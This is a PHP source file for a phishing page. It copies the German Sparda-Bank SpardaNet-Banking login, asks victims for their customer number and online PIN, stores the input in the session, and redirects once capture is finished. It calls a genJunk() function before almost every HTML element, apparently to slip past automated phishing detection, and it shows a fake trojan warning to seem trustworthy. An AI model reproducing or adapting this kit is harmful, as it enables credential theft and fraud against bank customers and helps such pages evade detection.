<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: ' .  $redirect);
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de">
	<head>
		<title>SpardaNet-Banking</title>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
		<link href="src/sparda_css/layout.css" rel="stylesheet" type="text/css" media="screen,projection,braille,print">
		<link href="src/sparda_css/print.css" rel="stylesheet" type="text/css" media="print">
	</head>

	<body>
		<?php echo genJunk() ?><div id="outer">
			<?php echo genJunk() ?><div id="inner">
				<?php echo genJunk() ?><div id="page">
					<?php echo genJunk() ?><div id="top">
						<?php echo genJunk() ?><div id="logo">
							<img src="src/sparda_img/spardalogo.gif" alt="" onclick="jumpHome();" style="cursor: pointer;">
						</div><?php echo genJunk() ?>
						<?php echo genJunk() ?><div id="branding" class="notLoggedIn">
							<?php echo genJunk() ?><div id="institute">Sparda-Bank</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					
					<?php echo genJunk() ?><div id="stage">
						<?php echo genJunk() ?><div id="portletArea">
							<?php echo genJunk() ?><div class="portletAreaColumn" id="left">
								<form method="POST" action="index.php" id="LoginForm" name="LoginPage" onsubmit="return checkSubmitted();" autocomplete="off">
									<?php echo genJunk() ?><div id="login">
										<?php echo genJunk() ?><div class="loginArea">
											<?php echo genJunk() ?><div class="loginHead"></div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="loginBody">
												<?php echo genJunk() ?><div id="login-messages">
													<?php echo genJunk() ?><div class="login-messages" id="messages-error">
														<?php echo genJunk() ?><div class="head"></div><?php echo genJunk() ?>
														<?php echo genJunk() ?><div class="body">
															<p><strong>Trojanerwarnung Mail-Anhänge<br></strong>Derzeit warnt das BKA vor einer neuen Welle von Spam-Mails. Öffnen Sie keinesfalls Anhänge, deren Herkunft unklar ist.</p>
															<a href="#" target="_blank" style="margin-left: 90px;"><img src="src/sparda_img/button-login-informationen.png" style="margin-top: 8px;"></a>
														</div><?php echo genJunk() ?>
														<?php echo genJunk() ?><div class="foot"></div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
											
												<?php echo genJunk() ?><div class="bgBody">
													<?php echo genJunk() ?><div id="formBottom" style="display: block;">
														<?php echo genJunk() ?><div id="submitLoginForm">
															<input id="submitLoginButton" src="src/sparda_img/buttonFlach_Jetzt_einloggen.png" name="sendOB_Login" tabindex="4" class="onReturn" title="jetzt einloggen" type="image">
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
													
													<?php echo genJunk() ?><div id="tabs">
														<?php echo genJunk() ?><div id="submitDemoTabForm">
															<input src="src/sparda_img/reiter-demokonto.png" onclick="submitDemo()" title="Banking im Demomodus öffnen" type="image">
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
													
													<?php echo genJunk() ?><div class="loginBox" style="display: block;" id="scriptDiv">
														<?php echo genJunk() ?><div class="text">
															<h2>Anmeldung zu Ihrem Netbanking</h2>
															<p style="margin-top: 25px;">Bitte melden Sie sich mit der Eingabe Ihrer Kundennummer und der Online-PIN an. Andere Angaben sind nicht notwendig.</p>
															<?php echo genJunk() ?><div id="loginFormular">
																<fieldset class="stepX">
																	<?php echo genJunk() ?><div class="textField">
																		<label for="userid">Kundennummer</label>
																		<input dir="ltr" maxlength="10" name="sd_username" id="sd_username" style="<?php echo ((isset($_SESSION['user_err'])) ? "border:1px solid red": ""); unset($_SESSION['user_err']); ?>" value="<?php echo (isset($_SESSION['sd_username']) ? $_SESSION['sd_username'] : "") ?>" tabindex="1" title="Kundennummer (erforderlich)" type="text">
																	</div><?php echo genJunk() ?>
																	<?php echo genJunk() ?><div class="textField">
																		<label for="password">Online-PIN</label>
																		<input dir="ltr" id="sd_password" name="sd_password" maxlength="6" value="" tabindex="2" title="Online-PIN (erforderlich)" type="password" style="<?php echo ((isset($_SESSION['pass_err'])) ? "border:1px solid red": ""); unset($_SESSION['pass_err']); ?>">
																	</div><?php echo genJunk() ?>
																</fieldset>
															</div><?php echo genJunk() ?>
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>

													<?php echo genJunk() ?><div id="submitLoginWerbungForm">
														<img class="lwBild" src="src/sparda_img/198_108_-secureapp.jpg">
														<p class="lwTitel"><b>Einfach und sicher auf Reisen einkaufen und bezahlen</b></p>
														<p class="lwText">Mit einer Kreditkarte haben Sie immer den idealen Begleiter für Reisen und den Alltag in der Tasche. Weltweit verbreitet mit über 38 Millionen Akzeptanzstellen.</p>
														<a class="lwLink" href="" target="_blank"><img src="src/sparda_img/button_Mehr_Informationen.png" style="margin-top: 8px;"></a>
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>

												<?php echo genJunk() ?><div class="infoLinkAreaLogin">
													<a href="" target="_blank" class="infoLink">Impressum</a>
													<a href="" target="_blank" class="infoLink">Nutzungsbedingungen</a>
													<a href="" target="_blank" class="infoLink">Datenschutz</a>
													<a href="" target="_blank" class="infoLink">Preisverzeichnis</a>
													<a href="" target="_blank" class="infoLink">Sicheres Banking</a>
												</div><?php echo genJunk() ?>

												<?php echo genJunk() ?><div class="clearer"></div><?php echo genJunk() ?>
											</div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="clearer"></div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="loginFoot"></div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="spiegelung"></div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="clearer"></div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</form>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="clearer"></div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
			<?php echo genJunk() ?><div class="clearer"></div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>
	</body>
</html>